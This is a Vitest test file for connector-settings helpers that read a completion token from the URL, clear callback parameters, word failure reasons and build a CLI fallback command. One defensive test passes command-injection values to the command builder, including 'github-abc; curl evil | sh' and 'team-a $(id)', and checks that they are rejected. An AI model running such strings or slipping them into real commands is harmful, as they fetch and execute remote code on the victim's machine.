import { describe, it, expect, beforeEach } from 'vitest'
import { callbackReasonMessage, clearConsentCallback, completionCommand, readCompletionToken } from './connectors'

describe('connectors helpers', () => {
  beforeEach(() => window.history.replaceState(null, '', '/settings/connectors'))

  it('reads the completion token and clears the whole callback only when asked', () => {
    window.history.replaceState(null, '', '/settings/connectors?status=pending&connection=c&namespace=n&other=1#completion=tok%2B1')
    expect(readCompletionToken()).toBe('tok+1')
    expect(readCompletionToken()).toBe('tok+1')
    clearConsentCallback()
    expect(window.location.hash).toBe('')
    // The callback keys go with the token; unrelated query state stays.
    expect(window.location.search).toBe('?other=1')
    expect(readCompletionToken()).toBeNull()
  })

  it('ignores fragments without a completion', () => {
    window.history.replaceState(null, '', '/settings/connectors#other=1')
    expect(readCompletionToken()).toBeNull()
  })

  it('names the CLI fallback with the sealed namespace', () => {
    expect(completionCommand('github-abc', 'team-a')).toBe('orka connection complete github-abc --namespace team-a --completion <value from the address bar>')
    expect(completionCommand('github-abc', undefined)).toBe('orka connection complete github-abc --completion <value from the address bar>')
    expect(completionCommand('github-abc', '')).toBe('orka connection complete github-abc --completion <value from the address bar>')
  })

  it('never turns a crafted callback into a shell command', () => {
    expect(completionCommand('github-abc; curl evil | sh', 'team-a')).toBeNull()
    expect(completionCommand('github-abc', 'team-a $(id)')).toBeNull()
    expect(completionCommand('Github-ABC', undefined)).toBeNull()
    expect(completionCommand(undefined, undefined)).toBeNull()
    expect(completionCommand('', undefined)).toBeNull()
    expect(completionCommand('a'.repeat(254), undefined)).toBeNull()
    expect(completionCommand('github-abc', 'a'.repeat(64))).toBeNull()
  })

  it('words the callback reasons', () => {
    expect(callbackReasonMessage('scopes_denied')).toMatch(/fewer permissions/)
    expect(callbackReasonMessage('provider_changed')).toMatch(/changed/)
    expect(callbackReasonMessage('mode_changed')).toMatch(/read only and read and write/)
    expect(callbackReasonMessage('consent_superseded')).toMatch(/newer consent/)
    expect(callbackReasonMessage(undefined)).toBe('Linking failed.')
    expect(callbackReasonMessage('weird')).toBe('Linking failed (weird).')
  })
})
